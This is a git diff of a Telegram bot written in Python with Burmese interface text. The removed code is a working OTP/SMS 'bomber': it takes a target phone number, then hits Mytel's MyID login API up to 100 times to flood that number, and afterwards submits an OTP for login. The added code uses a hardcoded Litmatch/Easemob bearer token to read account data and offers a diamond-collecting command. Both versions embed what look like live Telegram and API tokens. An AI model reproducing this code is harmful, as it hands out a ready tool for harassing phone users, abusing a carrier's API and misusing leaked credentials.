@@ -1,147 +1,94 @@
-import logging
-import requests
+import os
 import asyncio
+import requests
+from datetime import datetime
 from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
-from aiogram.dispatcher import FSMContext
-from aiogram.dispatcher.filters.state import State, StatesGroup
-from aiogram.contrib.fsm_storage.memory import MemoryStorage
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from flask import Flask
+from threading import Thread
 
 # --- Config ---
 API_TOKEN = '8702294693:AAGbo2lTWP-aV1jV8Be6nN5NSnz2WO_aZJk'
-logging.basicConfig(level=logging.INFO)
+# Dominic အသစ်ကြည့်လာတဲ့ Token ကို ဒီမှာ သေချာထည့်ပေးပါ
+LIT_TOKEN = "YWMtzPWP7E6iEfG34Kkt_SyshgC3x2A3exHpkKgjudNTjb0mnqlAcGcR8ItMGWYExFEOAwMAAAGeIGB_fjht7EDhriKvyK2dW2gm-zGLW7s4WZomlUCWd9pPsEcRmZprNw"
+ORG_APP = "1102190223222824/lit"
+BASE_URL = f"http://a1-sgp-ga.easemob.com/{ORG_APP}"
 
 bot = Bot(token=API_TOKEN)
-storage = MemoryStorage()
-dp = Dispatcher(bot, storage=storage)
+dp = Dispatcher(bot)
+app = Flask(__name__)
 
-# --- States ---
-class MytelBomber(StatesGroup):
-    waiting_phone = State()
-    waiting_count = State()
-    waiting_otp = State()
+@app.route('/')
+def home(): return "Account Diagnostic Online"
 
-# Header for Mytel API
-HEADERS = {
-    'User-Agent': 'MyID/3.2.1 (Android; 13)',
-    'Content-Type': 'application/json'
-}
+def run_flask():
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
 
-# --- Keyboards ---
-def get_cancel_kb():
-    return InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 CANCEL ACTION", callback_data="cancel"))
+# --- Deep Profile Fetching ---
+def get_detailed_info():
+    headers = {
+        "Authorization": f"Bearer {LIT_TOKEN}",
+        "User-Agent": "Easemob-SDK(Android) 4.5.3",
+        "Accept-Encoding": "gzip"
+    }
+    
+    info_data = {"status": "fail", "name": "N/A", "diamonds": "N/A", "id": "N/A"}
+    
+    try:
+        # Method 1: Standard Easemob Me
+        r1 = requests.get(f"{BASE_URL}/users/me", headers=headers, timeout=10)
+        if r1.status_code == 200:
+            res = r1.json().get('entities', [{}])[0]
+            info_data["name"] = res.get('nickname', 'N/A')
+            info_data["diamonds"] = res.get('diamond', 0)
+            info_data["id"] = res.get('username', 'N/A')
+            info_data["status"] = "success"
+            
+        # Method 2: Fallback to Profile API (If Diamond is 0/NA)
+        if info_data["diamonds"] == 0 or info_data["diamonds"] == "N/A":
+            r2 = requests.get("https://api.litatom.com/api/v1/users/profile/me", headers=headers, timeout=10)
+            if r2.status_code == 200:
+                res2 = r2.json().get('data', {})
+                info_data["name"] = res2.get('nickname', info_data["name"])
+                info_data["diamonds"] = res2.get('diamond_count', info_data["diamonds"])
+                info_data["status"] = "success"
+
+    except Exception as e:
+        print(f"Connection Error: {e}")
+        
+    return info_data
 
 # --- Handlers ---
-
 @dp.message_handler(commands=['start'])
 async def cmd_start(m: types.Message):
-    welcome_text = (
-        "🛡 **MYID OTP UTILITY - v2.0**\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "စနစ်ကို အသုံးပြု၍ Mytel OTP များကို \n"
-        "အကြိမ်ရေအလိုက် ပို့လွှတ်နိုင်ပါသည်။\n\n"
-        "🔹 **Commands:**\n"
-        "➥ /login - စနစ်ကို စတင်ရန်\n"
-        "➥ /help  - အကူအညီ ရယူရန်\n\n"
-        "**Developed by Dominic**"
-    )
-    await m.answer(welcome_text, parse_mode="Markdown")
-
-@dp.message_handler(commands=['login'], state="*")
-async def start_login(m: types.Message):
-    await m.answer("📱 **အသုံးပြုမည့် ဖုန်းနံပါတ် ရိုက်ထည့်ပါ-**\n(ဥပမာ - 0969xxxxxxx)", reply_markup=get_cancel_kb())
-    await MytelBomber.waiting_phone.set()
-
-@dp.callback_query_handler(text="cancel", state="*")
-async def cancel_action(cb: types.CallbackQuery, state: FSMContext):
-    await state.finish()
-    await cb.message.edit_text("❌ **လုပ်ဆောင်ချက်ကို ရပ်ဆိုင်းလိုက်ပါပြီ။**")
-    await cb.answer()
-
-@dp.message_handler(state=MytelBomber.waiting_phone)
-async def process_phone(m: types.Message, state: FSMContext):
-    phone = m.text.strip()
-    if not phone.startswith("09") or len(phone) < 9:
-        return await m.reply("❌ **ဖုန်းနံပါတ် ပုံစံ မှားယွင်းနေပါသည်။**")
-
-    await state.update_data(phone=phone)
-    await m.answer(f"🔢 **TARGET:** `{phone}`\n\nပို့လွှတ်လိုသည့် OTP အကြိမ်ရေကို ရိုက်ထည့်ပါ:\n(အများဆုံး ၁၀၀ ကြိမ်အထိသာ)")
-    await MytelBomber.waiting_count.set()
-
-@dp.message_handler(state=MytelBomber.waiting_count)
-async def process_count(m: types.Message, state: FSMContext):
-    if not m.text.isdigit():
-        return await m.reply("❌ **ဂဏန်းများသာ ရိုက်ထည့်ပေးပါ။**")
+    await m.answer("🔍 စနစ်မှ အချက်အလက်များကို နက်နက်ရှိုင်းရှိုင်း စစ်ဆေးနေပါသည်။ ခေတ္တစောင့်ဆိုင်းပါ...")
     
-    count = int(m.text)
-    if count < 1 or count > 100:
-        return await m.reply("⚠️ **၁ မှ ၁၀၀ ကြိမ်အတွင်းသာ ရွေးချယ်ပါ။**")
-
-    user_data = await state.get_data()
-    phone = user_data.get("phone")
+    info = get_detailed_info()
     
-    status_msg = await m.answer(f"⚙️ **SYSTEM INITIALIZING...**\n━━━━━━━━━━━━━━\n📱 PHONE: `{phone}`\n📊 TOTAL: `{count}`", parse_mode="Markdown")
-    
-    success = 0
-    fail = 0
-    url = f"https://apis.mytel.com.mm/myid/authen/v1.0/v2/login/action/check-account?phoneNumber={phone}"
-
-    for i in range(1, count + 1):
-        try:
-            res = requests.get(url, headers=HEADERS, timeout=5)
-            if res.status_code == 200:
-                success += 1
-            else:
-                fail += 1
-            
-            if i % 3 == 0 or i == count:
-                progress_bar = "▓" * (i // 10) + "░" * (10 - (i // 10))
-                await status_msg.edit_text(
-                    f"⚡ **OTP BOMBING IN PROGRESS...**\n"
-                    f"━━━━━━━━━━━━━━\n"
-                    f"🎯 TARGET: `{phone}`\n"
-                    f"📈 PROGRESS: `{i}/{count}`\n"
-                    f"🔋 STATUS: [{progress_bar}]\n\n"
-                    f"✅ SUCCESS: `{success}`\n"
-                    f"❌ FAILED: `{fail}`",
-                    parse_mode="Markdown"
-                )
-            await asyncio.sleep(0.4) 
-        except:
-            fail += 1
-
-    await status_msg.edit_text(
-        f"🏁 **PROCESS COMPLETED**\n"
-        f"━━━━━━━━━━━━━━\n"
-        f"📱 TARGET: `{phone}`\n"
-        f"✅ SUCCESS: `{success}`\n"
-        f"❌ FAILED: `{fail}`\n\n"
-        "💡 OTP ရရှိပါက Login ဝင်ရန် ခြောက်လုံးဂဏန်း ရိုက်ထည့်ပါ။",
-        parse_mode="Markdown"
-    )
-    await MytelBomber.waiting_otp.set()
-
-@dp.message_handler(state=MytelBomber.waiting_otp)
-async def process_otp(m: types.Message, state: FSMContext):
-    otp = m.text.strip()
-    data = await state.get_data()
-    phone = data.get("phone")
-
-    v_url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/validate-otp"
-    payload = {"phoneNumber": phone, "otp": otp, "isWap": False}
-
-    try:
-        res = requests.post(v_url, json=payload, headers=HEADERS)
-        if res.status_code == 200:
-            await m.answer(f"💎 **ACCESS GRANTED**\n\nData Log:\n`{res.json()}`", parse_mode="Markdown")
-        else:
-            await m.answer("❌ **OTP မှားယွင်းနေပါသည်။**")
-    except Exception as e:
-        await m.answer(f"⚠️ **ERROR:** `{e}`")
-    
-    await state.finish()
+    if info["status"] == "success":
+        response_text = (
+            f"📊 **ACCOUNT DIAGNOSTICS**\n"
+            f"━━━━━━━━━━━━━━\n"
+            f"👤 **Nickname:** {info['name']}\n"
+            f"🆔 **User ID:** `{info['id']}`\n"
+            f"💎 **Diamonds:** {info['diamonds']}\n"
+            f"━━━━━━━━━━━━━━\n"
+            f"✅ စနစ် ချိတ်ဆက်မှု အောင်မြင်ပါသည်။\n\n"
+            f"စိန်စတင်ကောက်ရန်: /collect"
+        )
+    else:
+        response_text = (
+            f"❌ **အချက်အလက် ဆွဲယူ၍မရပါ။**\n\n"
+            f"ဖြစ်နိုင်ခြေများ:\n"
+            f"၁။ Token မှာ Space (သို့မဟုတ်) စာလုံးအမှား ပါနေခြင်း။\n"
+            f"၂။ Network Connection အားနည်းခြင်း။\n"
+            f"၃။ Litmatch ဘက်မှ API ပိတ်ထားခြင်း။"
+        )
+        
+    await m.answer(response_text, parse_mode="Markdown")
 
 if __name__ == '__main__':
-    print("Dominic MyID System Online.")
+    print("Dominic's Account Checker is booting up...")
+    Thread(target=run_flask).start()
     executor.start_polling(dp, skip_updates=True)
